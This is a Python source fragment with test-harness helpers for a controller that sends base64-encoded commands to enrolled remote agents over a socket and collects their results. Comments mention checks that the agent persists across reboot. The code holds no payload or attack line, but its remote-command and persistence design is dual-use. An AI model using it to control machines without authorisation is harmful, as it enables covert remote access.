# ----------------------------------------------------------------------
# Harness helpers (used by runtime_verify / reboot_persist)
# ----------------------------------------------------------------------


def send_command(sock, command, timeout=60):
    """Send one v2 command and wait for its ACK+RESULT. Returns
    (status, payload_utf8) or None on timeout / connection loss. PONG,
    ACK and unrelated frames are skipped. NOTIFY frames from async writers
    are skipped here; the RESULT close-out is authoritative. The socket's
    blocking timeout is adjusted per call and restored afterwards.
    """
    cid = uuid.uuid4().hex[:12]
    try:
        send_message(sock, f"cmd|{cid}|{_b64(command)}")
    except OSError:
        return None
    old_timeout = None
    try:
        old_timeout = sock.gettimeout()
    except OSError:
        pass
    sock.settimeout(min(1.0, (timeout or 60)))
    deadline = time.time() + (timeout or 60)
    try:
        while time.time() < deadline:
            try:
                frame = receive_message(sock)
            except socket.timeout:
                continue
            except OSError:
                return None
            if frame is None:
                return None
            if frame.startswith("PONG|"):
                continue
            if frame.startswith("ACK|"):
                continue
            if frame.startswith("RESULT|"):
                parts = frame.split("|", 3)
                if len(parts) >= 4 and parts[1] == cid:
                    return parts[2], _unb64(parts[3])
            if frame.startswith("NOTIFY|"):
                continue
            # STATE_REQ other ids etc. are not expected from the agent side.
        return None
    finally:
        try:
            sock.settimeout(old_timeout)
        except OSError:
            pass


def run_main(host=HOST, port=PORT, auto_enroll=True):
    controller = MainController(host=host, port=port, auto_enroll=auto_enroll)
    controller.run()


if __name__ == "__main__":
    run_main()